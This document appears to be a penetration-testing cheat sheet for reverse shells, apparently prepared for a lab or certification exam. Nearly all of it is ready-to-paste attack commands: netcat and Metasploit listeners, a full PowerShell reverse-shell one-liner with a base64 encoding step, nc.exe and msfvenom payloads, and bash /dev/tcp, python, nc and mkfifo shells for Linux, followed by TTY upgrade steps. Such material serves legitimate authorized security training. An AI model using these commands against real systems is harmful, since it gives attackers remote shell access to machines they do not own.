# 03 — Reverse Shells & Listeners

**Ports: 4444 (main) · 5555 (privesc) · 6666 (spare). NOTHING ELSE.** Listener UP before payload.

## Listeners (Kali) — start first
```bash
nc -lvnp 4444                         # simplest; use for most catches
rlwrap nc -lvnp 4444                  # rlwrap = arrow keys / history in the caught shell
stty raw -echo; (stty size; cat) &    # (after catching) help with a fuller TTY — Linux targets
# Metasploit multi/handler (does NOT count as the one MSF use):
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT 4444; run"
```

## Windows reverse shells (pick one)
**PowerShell one-liner** (most reliable; paste into RCE / run via trigger):
```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=$r+'PS '+(pwd).Path+'> ';$sb=[Text.Encoding]::ASCII.GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
```
Base64 it to avoid quoting hell in a URL/field:
```bash
# On Kali: build an encoded command (swap LHOST/port), then run it on target as:
#   powershell -nop -e <BASE64>
SC='$c=New-Object Net.Sockets.TCPClient("'$LHOST'",4444);...'   # (full one-liner above)
echo -n "$SC" | iconv -t UTF-16LE | base64 -w0
```
**nc.exe** (upload it first — see `07`):
```cmd
nc.exe LHOST 4444 -e cmd.exe
```
**msfvenom-built exe** (staged payload; does NOT count as the one MSF use):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o payloads/rev4444.exe
# catch with:  nc -lvnp 4444   (shell_reverse_tcp = plain nc; meterpreter needs multi/handler)
```

## Linux reverse shells (if a box is Linux)
```bash
bash -i >& /dev/tcp/LHOST/4444 0>&1                  # classic
sh -i >& /dev/tcp/LHOST/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/bash")'
nc LHOST 4444 -e /bin/bash                           # if nc has -e
mkfifo /tmp/f;nc LHOST 4444 </tmp/f|/bin/sh>/tmp/f 2>&1;rm /tmp/f   # if not
```

## Upgrade to a proper TTY (Linux shell)
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'       # in the shell
# then: Ctrl-Z ; on Kali:  stty raw -echo; fg ; (enter) ; export TERM=xterm
```
Windows: prefer a PS shell; or get `evil-winrm` / RDP once you have creds (quieter, full console).

## Quick checklist
- [ ] Listener started on **4444/5555/6666** BEFORE firing the payload.
- [ ] LHOST = your Kali IP (`ip a`), reachable from target (same subnet / VPN).
- [ ] One port per shell — 4444 foothold, 5555 for the privesc SYSTEM/root shell, 6666 spare.
- [ ] Caught a shell? Immediately: `whoami /priv` (Win) or `id; sudo -l` (Linux) → privesc sheet.
